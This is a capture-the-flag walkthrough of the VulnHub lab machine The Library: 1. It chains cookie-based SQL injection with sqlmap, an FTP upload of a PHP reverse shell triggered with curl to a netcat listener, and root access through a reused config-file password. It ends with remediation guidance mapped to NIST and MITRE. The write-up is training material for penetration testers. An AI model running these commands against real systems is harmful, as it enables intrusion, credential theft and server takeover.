# The Library: 1 — The Books Hold the Keys

Look at this one, dude. A library-themed boot2root where the "catalog" is a SQL-injectable cookie and the "shelves" hide your escalation path in a PHP config file. The Library: 1 proves that the simplest data stores can open the deepest doors. No cap, the cookie injection chain here is textbook stuff that shows up in real web assessments constantly. Legit fun machine.

| Field | Value |
|---|---|
| **Level** | Beginner |
| **Target VM** | The Library: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/the-library-1,307/ |
| **Techniques** | Nmap service enumeration, dirb web content discovery, Burp Suite cookie interception, sqlmap SQL injection, FTP shell upload, password reuse privilege escalation |
| **CVEs** | CWE-89 (SQL Injection via cookie parameter), CWE-434 (Unrestricted PHP file upload via FTP), CWE-522 (Insufficiently Protected Credentials in PHP config) |
| **APT Groups** | APT41: uses SQL injection as a primary initial access vector in web-facing applications; FIN7: specifically leverages credential reuse patterns (database config passwords) for privilege escalation post-initial access |

---

## Attack Summary

```
nmap → ports 21 (FTP), 22 (SSH), 80 (HTTP)
  → HTTP: web app with PHP pages
  → dirb → hidden PHP page with login form
  → Burp Suite: intercept request → cookie parameter
  → sqlmap: inject cookie → dump FTP credentials
  → FTP: login → upload PHP reverse shell to web root
  → HTTP: trigger shell → www-data
  → shell stabilization (python pty + stty)
  → /var/www/html/config.php → database password
  → su root (password reuse) → uid=0(root)
  → /root/flag.txt
```

---

## Methodology

1. Network discovery and full port scan
2. Web content discovery with dirb to find hidden PHP pages
3. Cookie parameter interception with Burp Suite to identify injection point
4. SQL injection via sqlmap to dump FTP credentials
5. FTP login with dumped credentials; upload PHP reverse shell
6. Reverse shell execution and shell stabilization
7. Config file review revealing reused password
8. Root access via `su` with reused database password

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.103

nmap -sV -sC -p- 192.168.1.103
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.x
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Three services. FTP on a CTF machine almost always means something accessible. HTTP is the primary attack surface. SSH is the end goal.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Content Discovery

Browse to `http://192.168.1.103/`. Run a directory brute-force:

```bash
dirb http://192.168.1.103/ /usr/share/wordlists/dirb/common.txt
# Alternatively:
gobuster dir -u http://192.168.1.103/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 40
```

Discover hidden PHP pages. One will contain a login form.

**Real-world note:** Hidden admin and login pages discovered via directory brute-force are an extremely common finding in web application assessments. Many developers assume "security through obscurity" is sufficient. dirb and gobuster consistently locate these.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — Cookie Injection Identification

Browse to the discovered PHP page. Log in with any test credentials. Intercept the request in Burp Suite:

```
GET /book.php?bookisbn=1 HTTP/1.1
Host: 192.168.1.103
Cookie: book=1
```

The cookie parameter `book` is user-controlled and passed directly to the database. This is a classic blind SQL injection surface: no WHERE clause sanitization, no parameterized queries.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

---

## Step 4 — SQL Injection via sqlmap

Use sqlmap against the cookie parameter to dump the database:

```bash
sqlmap -u "http://192.168.1.103/book.php?bookisbn=1" \
  --cookie="book=1" \
  --level=3 \
  --risk=2 \
  --dbs
```

Enumerate databases, then tables, then dump credentials:

```bash
sqlmap -u "http://192.168.1.103/book.php?bookisbn=1" \
  --cookie="book=1" \
  -D <database_name> \
  --tables

sqlmap -u "http://192.168.1.103/book.php?bookisbn=1" \
  --cookie="book=1" \
  -D <database_name> \
  -T <table_name> \
  --dump
```

Recover FTP credentials: typically something like `admin:password` or similar.

**Alternative:** Manual injection via Burp Repeater with `' OR 1=1-- -` patterns to confirm injection before automating with sqlmap.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1552.001 — Credentials in Files

---

## Step 5 — FTP Access and Reverse Shell Upload

Log in to FTP with the dumped credentials:

```bash
ftp 192.168.1.103
# User: <recovered_user>
# Password: <recovered_password>

ftp> ls -la
ftp> pwd
```

FTP has write access to the web root (`/var/www/html/`). Upload a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit LHOST and LPORT in shell.php

ftp> put shell.php shell.php
ftp> quit
```

Start listener:

```bash
nc -lvnp 4444
```

Trigger the shell:

```bash
curl http://192.168.1.103/shell.php
```

**Real-world note:** FTP write access to a web root is a critical misconfiguration: any authenticated FTP user becomes a server compromise. APT41 specifically targets web-facing file upload vectors to establish initial footholds in compromised environments.

**MITRE ATT&CK:** T1021.003 — Remote Services: FTP; T1505.003 — Web Shell

---

## Step 6 — Shell Stabilization

After the netcat callback:

```bash
# On victim:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# On attacker: Ctrl+Z, then:
stty raw -echo; fg
# Press Enter twice
```

You now have a fully interactive shell as `www-data`.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — Credential Discovery in Config File

Enumerate the web root for configuration files:

```bash
find /var/www/html -name "*.php" -o -name "*.conf" -o -name "*.cfg" 2>/dev/null
cat /var/www/html/config.php
```

The database config file contains a plaintext password. Try it for root:

```bash
su root
# Enter the database password
id
# uid=0(root) gid=0(root) groups=0(root)
```

Password reuse: the database password and the root password are identical. This is one of the most common privilege escalation patterns in real environments.

**Real-world note:** FIN7 specifically enumerates web application configuration files post-initial-access as their first lateral movement step. Database config files (`config.php`, `wp-config.php`, `database.yml`) almost always contain plaintext credentials.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1548.003 — Abuse Elevation Control: Sudo and su

---

## Step 8 — Flag Capture

```bash
cat /root/flag.txt
ls /root/
```

(☞ﾟヮﾟ)☞ Root. The Library is yours.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| FTP credential | dumped via sqlmap | database table | FTP upload access |
| DB config password | /var/www/html/config.php | plaintext in PHP | su root (password reuse) |
| Root flag | flag.txt | /root/flag.txt | completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SQL injection via cookie parameter | Cookie-based injection is consistently underestimated: developers sanitize form inputs but forget cookies and headers | Test ALL user-controlled parameters: cookies, headers, URL fragments, not only form fields |
| 2 | FTP write access to web root | Any FTP user who can write to the web root can deploy a webshell; this is a configuration error | FTP chroot jail all users; web root must not be FTP-writable; prefer SFTP with key auth |
| 3 | Plaintext credentials in config file | Credentials in PHP config files are the single most common finding in web assessments | Use environment variables or secrets managers; never store credentials in web-accessible files |
| 4 | Password reuse across services | Database password = root password = single point of failure for entire system | Enforce unique passwords per service; use PAM or vaults for system credential management |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Persistence | Web Shell | T1505.003 |
| Execution | Execution | Unix Shell | T1059.004 |
| Lateral Movement | Lateral Movement | FTP Remote Services | T1021.003 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: su | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Parameterize all SQL queries** — no string concatenation with user-controlled input; use prepared statements in every PHP/MySQL interaction
2. **Remove FTP write access to web root** — chroot FTP users to upload-only directories outside web root; migrate to SFTP with key authentication
3. **Encrypt or externalize database credentials** — store in environment variables or a secrets manager; never in web-accessible PHP files
4. **Enforce unique passwords per service** — no password reuse between database, FTP, and system accounts
5. **Disable FTP over plaintext** — FTP transmits credentials in cleartext; migrate to SFTP or FTPS

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory FTP services and web-facing PHP config files |
| Protect | Access Control | Parameterized queries; FTP chroot; unique service passwords |
| Protect | Data Security | Secrets manager for database credentials |
| Detect | Anomalies and Events | Alert on FTP uploads to web root; anomalous SQL patterns |
| Respond | Response Planning | Remove webshells; rotate all credentials; patch injection |
| Recover | Recovery Planning | Rebuild from known-good snapshot; rotate all passwords |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-10 | Information Input Validation | Parameterized queries for all SQL; input validation on cookies |
| AC-3 | Access Enforcement | FTP users restricted to chroot; no web root write access |
| IA-5 | Authenticator Management | Unique passwords per service; rotate after compromise |
| SC-28 | Protection of Information at Rest | No plaintext credentials in web-accessible configuration files |
| CM-7 | Least Functionality | Disable plaintext FTP; restrict FTP to read-only if needed |

### CISA KEV

SQL injection (CWE-89) and unrestricted file upload (CWE-434) are both listed in CISA's top exploited vulnerability classes. CISA Binding Operational Directive 22-01 mandates prompt remediation of SQL injection vulnerabilities in Federal systems. Organizations should treat these as critical findings requiring immediate attention.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Situational Awareness (SITUATION) | Perform Logging | MIL2 |

### MITRE D3FEND

- **D3-IVA** — Input Validation (parameterized queries prevent SQL injection)
- **D3-ACH** — Application Configuration Hardening (FTP chroot; no web root write)
- **D3-OAM** — Operating System Administrative Management (unique passwords per service)

---

## Final Thoughts

The Library: 1 delivers a clean, teachable chain: inject the cookie, dump the creds, upload a shell, reuse the password. Each step is a real vulnerability class that appears in production assessments constantly. The machine is well-designed for beginners who need to internalize that attack chains are about chaining small wins, not one magic exploit.

The cookie injection is the most underappreciated step. Train yourself to test every parameter, not just form inputs. That habit alone will find more vulnerabilities than any single tool.

Thanks guys!! (❍ᴥ❍ʋ)
